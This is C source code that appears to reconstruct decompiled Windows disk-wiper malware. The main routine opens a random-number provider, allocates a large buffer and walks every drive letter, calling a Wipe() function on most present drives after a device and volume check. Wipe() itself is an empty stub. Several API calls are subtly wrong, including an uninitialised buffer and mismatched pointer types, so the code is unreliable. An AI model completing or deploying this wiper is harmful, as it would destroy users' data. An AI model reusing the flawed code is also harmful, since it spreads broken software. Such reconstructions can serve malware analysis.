#include <Windows.h>
#include <bcrypt.h>

int GetFullDevPath(WCHAR currentDrive);
void Wipe(ULONGLONG driveToWipe);

int main(int argc, char* argv[]) {

	WCHAR currentDrive = 0x41;
	LPWSTR pathBuf;
	int fullDevPath;
	DWORD idk = 0x5c003a;
	BCRYPT_ALG_HANDLE cngProvBuf = NULL;

	HANDLE hHeap = GetProcessHeap();
	ULONG_PTR heapBuf = HeapAlloc(hHeap, 8, 0x4000000);

	GetWindowsDirectoryW(pathBuf, 260);

	NTSTATUS bCrypt = BCryptOpenAlgorithmProvider(&cngProvBuf, L"RNG", NULL, 0);
	if (bCrypt != 0)
		cngProvBuf = NULL;

	UINT64 driveBitmask = GetLogicalDrives();

	while (driveBitmask != 0 && currentDrive < 0x5b) {
		fullDevPath = GetFullDevPath(currentDrive);
		if (driveBitmask & 1 && fullDevPath == 0) {
			Wipe(currentDrive);
		}
		driveBitmask >>= 1;
		currentDrive++;
	}

	if (cngProvBuf)										/* does not exist in decompiled code, but it is a good practice :) */
		BCryptCloseAlgorithmProvider(cngProvBuf, 0);

	ExitProcess(0);
}

int GetFullDevPath(WCHAR currentDrive) {

	LPWSTR dosQueryResult = (LPWSTR)malloc(260 * sizeof(WCHAR));

	if (dosQueryResult == NULL) {
		return 0;
	}

	DWORD msDosDevName = QueryDosDeviceW((LPCWSTR)currentDrive, &dosQueryResult, 260);

	if (msDosDevName < 3 || dosQueryResult[0] != L'\\' || dosQueryResult[1] != L'?' || dosQueryResult[2] != L'?') {
		free(dosQueryResult);
		return 0;
	}

	UINT volFlags[2];
	int volInfo = GetVolumeInformationW(&currentDrive, NULL, 0, NULL, NULL, volFlags, NULL, 0);
	if (volInfo == 0 || (volFlags[0] & 0x80000) == 0) {
		free(dosQueryResult);
		return 0;
	}

	free(dosQueryResult);
	return 1;
}

void Wipe(ULONGLONG driveToWipe) {

}